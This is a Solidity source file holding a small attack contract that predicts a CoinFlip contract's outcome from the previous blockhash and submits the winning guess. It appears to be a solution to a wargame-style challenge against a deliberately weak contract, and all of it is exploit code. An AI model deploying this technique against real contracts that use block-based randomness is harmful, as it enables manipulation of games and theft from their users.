// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract hackflip {
    CoinFlip public originalContract = CoinFlip(address(0x3c53AEB18047cE30EaA37216E06Da4120BC83688)); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip(bool _guess) public {

        // pre-deteremine the flip outcome
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            originalContract.flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            originalContract.flip(!_guess);
        }
    }
}